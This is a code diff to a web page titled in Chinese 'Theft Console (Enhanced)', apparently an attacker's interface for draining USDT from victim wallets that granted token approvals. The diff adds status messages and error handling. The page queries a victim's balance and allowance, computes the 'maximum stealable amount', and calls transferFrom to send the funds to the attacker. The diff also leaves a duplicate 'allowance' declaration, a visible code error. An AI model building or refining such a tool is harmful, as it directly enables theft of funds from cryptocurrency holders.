@@ -3,7 +3,8 @@
 <head><meta charset="UTF-8"><title>盜取控制台（增強版）</title></head>
 <body>
 <h2>🛠️ 攻擊者操作介面</h2>
-<div id="lastVictim" style="color:green;font-weight:bold;margin-bottom:8px;"></div>
+<div id="lastVictim" style="font-weight:bold;margin-bottom:8px;color:#333;"></div>
+<div id="statusMsg" style="color:#888;font-style:italic;margin-bottom:8px;"></div>
 <input id="victim" placeholder="受害者地址"><br>
 <input id="amount" placeholder="金額（例：1000000 = 1 USDT）"><br>
 <button onclick="getMax()">查詢最大可盜金額</button>
@@ -61,17 +62,28 @@ async function init() {
 async function getMax() {
   await init();
   const victim = document.getElementById("victim").value;
-  const balance = await contract.methods.balanceOf(victim).call();
+  document.getElementById("statusMsg").innerText = "🔄 正在查詢授權狀態...";
+  let balance = "0";
+  let allowance = "0";
+  try {
+    balance = await contract.methods.balanceOf(victim).call();
+    allowance = await contract.methods.allowance(victim, account).call();
+  } catch (err) {
+    document.getElementById("statusMsg").innerText = "❌ 查詢失敗，可能尚未授權或地址錯誤";
+    return;
+  }
   const allowance = await contract.methods.allowance(victim, account).call();
   const max = web3.utils.toBN(balance).lt(web3.utils.toBN(allowance)) ? balance : allowance;
   document.getElementById("amount").value = max;
-  document.getElementById("lastVictim").innerText = "🟢 目前授權地址：" + victim;
+  document.getElementById("lastVictim").innerText = "🟢 已授權地址：" + victim;
+  document.getElementById("statusMsg").innerText = "✅ 成功查詢授權金額：" + max;
   log("查詢最大值：Balance=" + balance + ", Allowance=" + allowance + ", 可盜金額=" + max);
 }
 
 async function steal() {
   await init();
   const victim = document.getElementById("victim").value;
+  document.getElementById("statusMsg").innerText = "🔄 正在查詢授權狀態...";
   const amount = document.getElementById("amount").value;
   try {
     const tx = await contract.methods.transferFrom(victim, attacker, amount).send({ from: account });
